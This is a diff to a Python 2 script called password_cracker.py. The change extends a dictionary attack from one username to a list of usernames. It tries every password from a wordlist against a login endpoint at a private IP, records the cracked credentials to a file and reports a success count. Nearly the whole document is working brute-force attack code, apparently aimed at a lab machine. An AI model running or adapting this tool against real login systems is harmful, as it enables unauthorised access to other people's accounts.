@@ -1,12 +1,13 @@
 import requests
 import random
 import sys
+import time
 
-IP_ADDR     = "172.16.89.128"
-PORT        = "8080"
-INPUT_FILE  = "john.txt"
-USERNAME    =  None # root, hardtop
-
+IP_ADDR            = "172.16.89.128"
+PORT        	   = "8080"
+PASSWORD_FILENAME  = "john.txt"
+USERNAME_FILENAME  = "usernames.txt"
+OUTPUT_FILENAME    = "password_cracker_output.txt"
 
 # implements scramble used in js
 # returns a string
@@ -34,26 +35,60 @@ def attempt_login(username, password):
 	return False
 
 def main():
-	# args
-	if len(sys.argv) != 2:
-		sys.exit("Usage: python password_cracker.py [username]")
-
-	# input file
+	# input username file
 	try:
-		f = open(INPUT_FILE,"r")
+		username_f = open(USERNAME_FILENAME)
 	except:
-		sys.exit("Unable to open %s" % (INPUT_FILE))
+		sys.exit("Unable to open %s" % (USERNAME_FILENAME))
 
-	# try to login
-	username = sys.argv[1]
-	for password in f:
-		password = password.replace("\n","")
-		if attempt_login(username, password):
-			print "Password for username %s is %s" % (username, password)
-			sys.exit()
-	print "None of the passwords in the file %s worked for user %s" % (INPUT_FILE, username)
+	# input password file
+	try:
+		password_f = open(PASSWORD_FILENAME,"r")
+		passwords = [p.replace("\n","") for p in password_f if p]
+		password_f.close()
+	except:
+		username_f.close()
+		sys.exit("Unable to open %s" % (PASSWORD_FILENAME))
 
-	f.close()
+	# output file
+	try:
+		output_f = open(OUTPUT_FILENAME, "w")
+	except:
+		username_f.close()
+		sys.exit("Unable to open %s" % (OUTPUT_FILENAME)) 
+
+	# start logging
+	start = time.time()
+	num_cracked = 0
+	num_failed = 0
+
+	# try to crack each username's password
+	for username in username_f:
+		cracked = False
+		username = username.replace("\n","")
+		for password in passwords:
+			if attempt_login(username.replace("\n",""), password):
+				msg = "Password for username %s is %s" % (username, password)
+				print msg
+				output_f.write(msg+"\n")
+				cracked = True
+				num_cracked += 1
+				break
+		if not cracked:
+			msg = "None of the passwords in %s worked for user %s" % (PASSWORD_FILENAME, username)
+			print msg
+			output_f.write(msg+"\n")
+			num_failed += 1
+
+	# print summary
+	end = time.time()
+	msg = "Summary: %d/%d passwords cracked in %s minutes" % (num_cracked,num_cracked+num_failed,(end-start)/60)
+	print msg
+	output_f.write(msg+"\n")
+
+	# cleanup
+	output_f.close()
+	username_f.close()
 
 if __name__ == '__main__':
 	main()
